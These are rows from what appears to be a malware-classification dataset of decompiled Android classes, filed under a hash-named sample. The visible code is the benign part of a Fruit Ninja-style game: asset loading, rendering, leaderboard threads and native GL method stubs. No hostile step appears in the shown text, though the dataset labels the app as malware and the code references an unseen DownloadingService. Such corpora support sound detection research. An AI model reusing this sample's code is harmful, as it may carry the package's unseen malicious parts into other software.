MANGOSTEEN2_2=41;   private static final int ORANGE0=42;   private static final int ORANGE1=43;   private static final int ORANGE1_1=45;   private static final int ORANGE1_2=46;   private static final int ORANGE2=44;   private static final int ORANGE2_1=47;   private static final int ORANGE2_2=48;   private static final int PAPAYA0=49;   private static final int PAPAYA1=50;   private static final int PAPAYA1_1=52;   private static final int PAPAYA1_2=53;   private static final int PAPAYA2=51;   private static final int PAPAYA2_1=54;   private static final int PAPAYA2_2=55;   private static final int PEACH0=56;   private static final int PEACH1=57;   private static final int PEACH1_1=59;   private static final int PEACH1_2=60;   private static final int PEACH2=58;   private static final int PEACH2_1=61;   private static final int PEACH2_2=62;   private static final int PIANEAPPLE0=63;   private static final int PIANEAPPLE1=64;   private static final int PIANEAPPLE1_1=66;   private static final int PIANEAPPLE1_2=67;   private static final int PIANEAPPLE2=65;   private static final int PIANEAPPLE2_1=68;   private static final int PIANEAPPLE2_2=69;   private static final int PIC_NUM=68;   private static final int TEX_ABOUT_CONTENT=32;   private static final int TEX_ABOUT_DEVELOPER=33;   private static final int TEX_ABOUT_TITLE=34;   private static final int TEX_ALL01_FRUIT=3;   private static final int TEX_ALL02_FRUIT=4;   private static final int TEX_ALL03_JUICE=5;   private static final int TEX_BACKGROUND=0;   private static final int TEX_BAMBOO_LEFT=1;   private static final int TEX_BAMBOO_RIGHT=2;   private static final int TEX_BOARD2=67;   private static final int TEX_BTN_BACK=6;   private static final int TEX_BTN_EXIT=7;   private static final int TEX_BTN_HELP=8;   private static final int TEX_BTN_MUSIC_OFF=9;   private static final int TEX_BTN_MUSIC_ON=10;   private static final int TEX_BTN_PAUSE=11;   private static final int TEX_BTN_PLAY=12;   private static final int TEX_DATA1=13;   private static final int TEX_DATA2=14;   private static final int TEX_DATA3=15;   private static final int TEX_DATA4=16;   private static final int TEX_DATA5=17;   private static final int TEX_HELP_BOMBMODE=35;   private static final int TEX_HELP_BOMBMODE_CONTENT=36;   private static final int TEX_HELP_SMASHMODE=37;   private static final int TEX_HELP_SMASHMODE_CONTENT=38;   private static final int TEX_HELP_SPECIALMODE=39;   private static final int TEX_HELP_SPECIALMODE_CONTENT=40;   private static final int TEX_HELP_TIMEMODE=41;   private static final int TEX_HELP_TIMEMODE_CONTENT=42;   private static final int TEX_MAIN_ICON_LEMON=18;   private static final int TEX_MAIN_ICON_WATERMELON=19;   private static final int TEX_MAIN_PANDA=20;   private static final int TEX_MAIN_TITLE=21;   private static final int TEX_MAIN_TITLE_ABOUT=22;   private static final int TEX_MAIN_TITLE_LEADERBOARD=23;   private static final int TEX_MAIN_TITLE_PLAY=24;   private static final int TEX_MODE_BOMB=26;   private static final int TEX_MODE_SMASH=27;   private static final int TEX_MODE_SOPT_RED=29;   private static final int TEX_MODE_SPECIAL=28;   private static final int TEX_MODE_SPOT_WHITE=30;   private static final int TEX_MODE_START=31;   private static final int TEX_MODE_TIME=25;   private static final int TEX_PALY_GAMEOVER=46;   private static final int TEX_PLAY_BEST=43;   private static final int TEX_PLAY_COMBO=44;   private static final int TEX_PLAY_COMBO10=45;   private static final int TEX_PLAY_ICON_ALIVE=58;   private static final int TEX_PLAY_ICON_CUTLIGHTING=57;   private static final int TEX_PLAY_ICON_CUTNOTHING=56;   private static final int TEX_PLAY_ICON_DEAD=59;   private static final int TEX_PLAY_ICON_MISS=55;   private static final int TEX_PLAY_ICON_SCORE=54;   private static final int TEX_PLAY_LEVEL1=47;   private static final int TEX_PLAY_LEVEL2=48;   private static final int TEX_PLAY_LEVEL3=49;   private static final int TEX_PLAY_LEVEL4=50;   private static final int TEX_PLAY_PAUSE=51;   private static final int TEX_PLAY_POINT=52;   private static final int TEX_PLAY_TIMEUP=53;   private static final int TEX_SCORE_BEST=60;   private static final int TEX_SCORE_LEVEL1=61;   private static final int TEX_SCORE_LEVEL2=62;   private static final int TEX_SCORE_LEVEL3=63;   private static final int TEX_SCORE_LEVEL4=64;   private static final int TEX_SCORE_REPLAY=65;   private static final int TEX_SCORE_SCORE=66;   private static final int TOMATO0=70;   private static final int TOMATO1=71;   private static final int TOMATO1_1=73;   private static final int TOMATO1_2=74;   private static final int TOMATO2=72;   private static final int TOMATO2_1=75;   private static final int TOMATO2_2=76;   private static final int WATERMELON0=77;   private static final int WATERMELON1=78;   private static final int WATERMELON1_1=80;   private static final int WATERMELON1_2=81;   private static final int WATERMELON2=79;   private static final int WATERMELON2_1=82;   private static final int WATERMELON2_2=83;   private static boolean sResizeFlag=false;   private String TAG=""DemoRenderer"";   private int ct;   private int mBestClassicModeScore;   private int mBestTimeModeScore;   private final Context mContext;   private int mLoadingObjectFlag;   private int mWindowHeight;   private int mWindowWidth;   private long mt;   public DemoRenderer(  Context aContext){     this.mContext=aContext;   }   private boolean LoadTexture(  int index){     ResourceDecoder.RawInfo riInfo=null; switch (index) { case DownloadingService.g:       riInfo=ResourceDecoder.decodeAssets(this.mContext,""background.png"");     break; case 1:   riInfo=ResourceDecoder.decodeAssets(this.mContext,""bamboo_left.png""); break; case 2: riInfo=ResourceDecoder.decodeAssets(this.mContext,""bamboo_right.png""); break; case 3: riInfo=ResourceDecoder.decodeAssets(this.mContext,""all01_fruit.png""); break; case 4: riInfo=ResourceDecoder.decodeAssets(this.mContext,""all02_fruit.png""); break; case 5: riInfo=ResourceDecoder.decodeAssets(this.mContext,""all03_juice.png""); break; case 6: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_back.png""); break; case 7: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_exit.png""); break; case 8: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_help.png""); break; case 9: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_music_off.png""); break; case 10: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_music_on.png""); break; case 11: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_pause.png""); break; case 12: riInfo=ResourceDecoder.decodeAssets(this.mContext,""btn_play.png""); break; case 13: riInfo=ResourceDecoder.decodeAssets(this.mContext,""data1.png""); break; case 14: riInfo=ResourceDecoder.decodeAssets(this.mContext,""data2.png""); break; case 15: riInfo=ResourceDecoder.decodeAssets(this.mContext,""data3.png""); break; case g.g: riInfo=ResourceDecoder.decodeAssets(this.mContext,""data4.png""); break; case 17: riInfo=ResourceDecoder.decodeAssets(this.mContext,""data5.png""); break; case 18: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_icon_lemon.png""); break; case 19: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_icon_watermelon.png""); break; case 20: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_panda.png""); break; case 21: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_title.png""); break; case 22: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_title_about.png""); break; case 23: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_title_leaderboard.png""); break; case 24: riInfo=ResourceDecoder.decodeAssets(this.mContext,""main_title_play.png""); break; case 25: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_time.png""); break; case 26: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_bomb.png""); break; case 27: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_smash.png""); break; case 28: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_special.png""); break; case 29: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_spot_red.png""); break; case 30: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_spot_white.png""); break; case 31: riInfo=ResourceDecoder.decodeAssets(this.mContext,""mode_start.png""); break; case g.f: riInfo=ResourceDecoder.decodeAssets(this.mContext,""about_content.png""); break; case 33: riInfo=ResourceDecoder.decodeAssets(this.mContext,""about_developer.png""); break; case 34: riInfo=ResourceDecoder.decodeAssets(this.mContext,""about_title.png""); break; case 35: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_bombmode.png""); break; case 36: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_bombmode_content.png""); break; case 37: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_smashmode.png""); break; case 38: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_smashmode_content.png""); break; case 39: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_specialmode.png""); break; case 40: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_specialmode_content.png""); break; case 41: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_timemode.png""); break; case 42: riInfo=ResourceDecoder.decodeAssets(this.mContext,""help_timemode_content.png""); break; case 43: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_best.png""); break; case 44: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_combo.png""); break; case 45: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_combo10.png""); break; case 46: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_gameover.png""); break; case 47: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_level1.png""); break; case 48: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_level2.png""); break; case 49: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_level3.png""); break; case 50: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_level4.png""); break; case 51: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_pause.png""); break; case 52: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_point.png""); break; case 53: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_timeup.png""); break; case 54: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_score.png""); break; case 55: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_miss.png""); break; case g.e: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_cutnothing.png""); break; case 57: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_cutlighting.png""); break; case 58: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_alive.png""); break; case 59: riInfo=ResourceDecoder.decodeAssets(this.mContext,""play_icon_dead.png""); break; case 60: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_best.png""); break; case 61: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_level1.png""); break; case 62: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_level2.png""); break; case 63: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_level3.png""); break; case 64: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_level4.png""); break; case 65: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_replay.png""); break; case 66: riInfo=ResourceDecoder.decodeAssets(this.mContext,""score_score.png""); break; case 67: riInfo=ResourceDecoder.decodeAssets(this.mContext,""board2.png""); break; } if (riInfo != null) { GL1Lib.nativeLoadTextureStream(riInfo.data,riInfo.length,index); return true; } Log.i(this.TAG,""--info is null""); return false; } private boolean LoadFruit(int index){ int flag; ResourceDecoder.RawInfo riInfo=null; int r=0; int g=0; int b=0; switch (index) { case DownloadingService.g: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana0); break; case 1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana1); break; case 2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana2); break; case 3: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana1_1); break; case 4: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana1_2); break; case 5: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana2_1); break; case 6: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.banana2_2); break; case 7: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe0); r=241; g=193; b=170; break; case 8: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe1); r=241; g=193; b=170; break; case 9: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe2); r=241; g=193; b=170; break; case 10: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe1_1); r=241; g=193; b=170; break; case 11: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe1_2); r=241; g=193; b=170; break; case 12: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe2_1); r=241; g=193; b=170; break; case 13: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.cantaloupe2_2); r=241; g=193; b=170; break; case 14: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola0); r=68; g=190; b=48; break; case 15: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola1); r=68; g=190; b=48; break; case g.g: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola2); r=68; g=190; b=48; break; case 17: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola1_1); r=68; g=190; b=48; break; case 18: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola1_2); r=68; g=190; b=48; break; case 19: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola2_1); r=68; g=190; b=48; break; case 20: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.carambola2_2); r=68; g=190; b=48; break; case 21: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut0); r=230; g=230; b=230; break; case 22: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut1); r=230; g=230; b=230; break; case 23: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut2); r=230; g=230; b=230; break; case 24: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut1_1); r=230; g=230; b=230; break; case 25: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut1_2); r=230; g=230; b=230; break; case 26: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut2_1); r=230; g=230; b=230; break; case 27: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.coconut2_2); r=230; g=230; b=230; break; case 28: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon0); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 29: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon1); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 30: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon2); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 31: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon1_1); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case g.f: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon1_2); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 33: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon2_1); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 34: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.lemon2_2); r=174; g=FruitNinjiaGL1Activity.ACTION_MASK; b=0; break; case 35: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen0); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 36: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen1); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 37: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen2); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 38: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen1_1); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 39: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen1_2); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 40: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen2_1); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 41: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.mangosteen2_2); r=227; g=41; b=FruitNinjiaGL1Activity.ACTION_MASK; break; case 42: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange0); r=252; g=36; b=0; break; case 43: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange1); r=252; g=36; b=0; break; case 44: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange2); r=252; g=36; b=0; break; case 45: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange1_1); r=252; g=36; b=0; break; case 46: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange1_2); r=252; g=36; b=0; break; case 47: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange2_1); r=252; g=36; b=0; break; case 48: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.orange2_2); r=252; g=36; b=0; break; case 49: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya0); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 50: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 51: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 52: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya1_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 53: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya1_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 54: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya2_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case 55: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.papaya2_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=136; b=48; break; case g.e: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach0); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 57: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 58: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 59: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach1_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 60: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach1_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 61: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach2_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 62: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.peach2_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=239; b=61; break; case 63: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple0); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case 64: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case 65: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case 66: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple1_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case 67: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple1_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case 68: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple2_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case PIANEAPPLE2_2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.pineapple2_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=246; b=14; break; case TOMATO0: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato0); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case TOMATO1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case TOMATO2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case TOMATO1_1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato1_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case TOMATO1_2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato1_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case TOMATO2_1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato2_1); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case 76: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.tomato2_2); r=FruitNinjiaGL1Activity.ACTION_MASK; g=0; b=0; break; case WATERMELON0: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon0); r=250; g=11; b=11; break; case WATERMELON1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon1); r=250; g=11; b=11; break; case WATERMELON2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon2); r=250; g=11; b=11; break; case WATERMELON1_1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon1_1); r=250; g=11; b=11; break; case WATERMELON1_2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon1_2); r=250; g=11; b=11; break; case WATERMELON2_1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon2_1); r=250; g=11; b=11; break; case WATERMELON2_2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.watermelon2_2); r=250; g=11; b=11; break; case BOMB1: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.bomb); r=250; g=11; b=11; break; case BOMB2: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.bomb); r=250; g=11; b=11; break; case BOMB3: riInfo=ResourceDecoder.decodeRaw(this.mContext,R.raw.bomb); r=250; g=11; b=11; break; } if (index < BOMB1) { flag=index % 7; }  else { flag=index - BOMB1; } if (riInfo != null) { GL1Lib.nativeLoadFruit(riInfo.data,index,flag,(byte)r,(byte)g,(byte)b); return true; } return true; } private void LoadResources(){ Log.i(this.TAG,""Enter LoadResources!""); for (int j=0; j < 68; j++) { LoadTexture(j); } for (int i=0; i < FRUIT_NUM; i++) { LoadFruit(i); } Log.i(this.TAG,""Leave LoadResources!""); } @Override public void onSurfaceCreated(GL10 gl,EGLConfig config){ if (this.mLoadingObjectFlag == 0) { this.mWindowWidth=DemoGLSurfaceView.mwidth; this.mWindowHeight=DemoGLSurfaceView.mheight; if (this.mWindowHeight > this.mWindowWidth) { this.mWindowWidth^=this.mWindowHeight; this.mWindowHeight=this.mWindowWidth ^ this.mWindowHeight; this.mWindowWidth^=this.mWindowHeight; } } LoadResources(); GL1Lib.nativeInitGLEnvironment(this.mWindowWidth,this.mWindowHeight); this.mBestTimeModeScore=History.getTimeModeScore(this.mContext); GL1Lib.nativeSetTimeModeBestScore(this.mBestTimeModeScore); this.mBestClassicModeScore=History.getClassicModeScore(this.mContext); GL1Lib.nativeSetClassicModeBestScore(this.mBestClassicModeScore); GL1Lib.nativeSetSmashModeBestScore(History.getSmashModeScore(this.mContext)); GL1Lib.nativeGetRun(); GL1Lib.nativeInitGLObjects(); GL1Lib.nativeSetRun(); Log.i(this.TAG,""GL1View onSurfaceCreated,mLoadingObjectFlag="" + this.mLoadingObjectFlag + ""width=""+ this.mWindowWidth+ ""height=""+ this.mWindowHeight); } @Override public void onSurfaceChanged(GL10 gl,int w,int h){ GL1Lib.nativeResize(this.mWindowWidth,this.mWindowWidth); Log.i(this.TAG,""GL1View onSurfaceChanged...""); } @Override public void onDrawFrame(GL10 gl){ if (this.mLoadingObjectFlag == 1) { this.mLoadingObjectFlag=2; return; } if (this.mLoadingObjectFlag == 0) { if (FruitNinjiaGL1Activity.playMusicFlag != 0) { FruitNinjiaGL1Activity.mSound.playMusic(FruitNinjiaGL1Activity.mMusic,true); } this.mLoadingObjectFlag=1; } if (!sResizeFlag) { int flag=GL1Lib.nativeRender(); if ((flag & 15) == 1 && FruitNinjiaGL1Activity.playMusicFlag != 0) { FruitNinjiaGL1Activity.mSound.play(5,0,5); } if ((flag & 15) == 2) { this.mLoadingObjectFlag=4; } if ((flag & 15) == 3) { FruitNinjiaGL1Activity.mSound.play(4,0,5); } if ((flag & 240) == 16) { History.writeTimeModeScore(this.mContext,GL1Lib.nativeGetTimeModeBestScore()); History.writeClassicModeScore(this.mContext,GL1Lib.nativeGetClassicModeBestScore()); History.writeSmashModeScore(this.mContext,GL1Lib.nativeGetSmashModeBestScore()); History.writeSpecialModeScore(this.mContext,GL1Lib.nativeGetSpecialModeBestScore()); } if ((flag & 240) == 32) { FruitNinjiaGL1Activity.mShowHistoryFlag=1; } if ((flag & 240) == 48 && History.getLeaderflag(this.mContext) == 1) { GL1Lib.nativeSetGameMode(8); } } if (this.mLoadingObjectFlag == 2) { this.mLoadingObjectFlag=3; if (FruitNinjiaGL1Activity.playMusicFlag != 0) { FruitNinjiaGL1Activity.mSound.play(4,0,5); } } if (this.mLoadingObjectFlag == 4) { if (Math.abs(System.currentTimeMillis() - this.mt) >= 1000) { if (FruitNinjiaGL1Activity.playMusicFlag != 0) { FruitNinjiaGL1Activity.mSound.play(6,0,5); } this.mt=System.currentTimeMillis(); this.ct++; } if (this.ct == 5) { this.ct=0; this.mLoadingObjectFlag=5; } } } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.activity\FruitNinjiaGL1Activity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1e033801"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.activity\LeaderBoardThread.code","public class LeaderBoardThread extends Thread {   public LeaderBoardThread(){   }   @Override public void run(){     do {     }  while (FruitNinjiaGL1Activity.mShowHistoryFlag != 1);     FruitNinjiaGL1Activity.this.startActivity(FruitNinjiaGL1Activity.this.mIntent);     FruitNinjiaGL1Activity.mShowHistoryFlag=0;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.activity\WriteLeaderShow.code","public class WriteLeaderShow extends Thread {   public WriteLeaderShow(){   }   @Override public void run(){     History.writeLeaderflag(FruitNinjiaGL1Activity.this.mContext,FruitNinjiaGL1Activity.this.mShowLeaderFlag);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\GamePlayerInfo.code","public class GamePlayerInfo {   private String playerName;   private int playerRanking;   private int playerScore;   public void setPlayerRanking(  int playerRanking){     this.playerRanking=playerRanking;   }   public int getPlayerRanking(){     return this.playerRanking;   }   public void setPlayerName(  String playerName){     this.playerName=playerName;   }   public String getPlayerName(){     return this.playerName;   }   public void setPlayerScore(  int playerScore){     this.playerScore=playerScore;   }   public int getPlayerScore(){     return this.playerScore;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\GL1Lib.code","public class GL1Lib {   public static int iDeviceLevel;   public static native int nativeCheckMemoryAvalable();   public static native void nativeDone();   public static native int nativeGetActionMode();   public static native int nativeGetClassicModeBestScore();   public static native int nativeGetCurrentScore();   public static native int nativeGetDeviceLevel();   public static native int nativeGetGameMode();   public static native int nativeGetGameType();   public static native int nativeGetRun();   public static native int nativeGetSmashModeBestScore();   public static native int nativeGetSpecialModeBestScore();   public static native int nativeGetTimeModeBestScore();   public static native void nativeInit(  int i,  int i2,  int i3,  int i4);   public static native int nativeInitGLEnvironment(  int i,  int i2);   public static native int nativeInitGLObjects();   public static native void nativeLoadA3D(  byte[] bArr,  int i,  int i2);   public static native void nativeLoadAni(  byte[] bArr,  int i,  int i2);   public static native void nativeLoadBomb(  byte[] bArr);   public static native void nativeLoadFruit(  byte[] bArr,  int i,  int i2,  byte b,  byte b2,  byte b3);   public static native void nativeLoadLoadingSprite();   public static native int nativeLoadTextureStream(  byte[] bArr,  int i,  int i2);   public static native void nativePause();   public static native int nativeRender();   public static native void nativeResize(  int i,  int i2);   public static native void nativeSetActionMode(  int i);   public static native int nativeSetClassicModeBestScore(  int i);   public static native int nativeSetDeviceLevel(  int i);   public static native int nativeSetGameMode(  int i);   public static native int nativeSetGameType(  int i);   public static native void nativeSetMusicFlag(  int i) throws UnsatisfiedLinkError ;   public static native void nativeSetRun();   public static native int nativeSetSmashModeBestScore(  int i);   public static native int nativeSetSpecialModeBestScore(  int i);   public static native int nativeSetTimeModeBestScore(  int i);   public static native int nativeTellPlayerBack();   public static native void nativeTouchDown(  int i,  float f,  float f2);   public static native int nativeTouchScroll(  int i,  float f,  float f2,  float f3,  float f4);   public static native int nativeTouchUp(  int i,  float f,  float f2); static {     Calendar.getInstance();     System.loadLibrary(""NinJiaGL1"");   } } "
